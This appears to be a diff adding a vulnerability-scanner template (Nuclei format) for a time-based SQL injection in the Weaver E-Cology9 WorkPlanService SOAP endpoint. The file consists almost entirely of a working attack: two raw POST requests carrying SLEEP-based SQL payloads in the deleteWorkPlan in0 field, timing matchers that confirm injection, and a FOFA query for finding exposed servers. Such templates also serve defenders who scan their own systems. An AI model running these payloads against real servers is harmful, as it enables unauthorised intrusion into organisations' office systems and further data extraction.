@@ -1,0 +1,61 @@
+id: Weaver-E-Cology9-WorkPlanService-sql
+
+info:
+  name: 泛微E-Cology9 WorkPlanService 前台SQL注入漏洞(XVE-2024-18112)
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="泛微-OA（e-cology）"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /services/WorkPlanService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+          <soapenv:Header/>
+            <soapenv:Body>
+            <web:deleteWorkPlan>
+              <!--type: string-->
+              <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(4-(IF(27=27,0,5)))))NZeo)</web:in0>
+              <!--type: int-->
+              <web:in1>22</web:in1>
+            </web:deleteWorkPlan>
+            </soapenv:Body>
+        </soapenv:Envelope>
+      - |
+        POST /services/WorkPlanService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+          <soapenv:Header/>
+            <soapenv:Body>
+            <web:deleteWorkPlan>
+              <!--type: string-->
+              <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(8-(IF(27=27,0,5)))))NZeo)</web:in0>
+              <!--type: int-->
+              <web:in1>22</web:in1>
+            </web:deleteWorkPlan>
+            </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
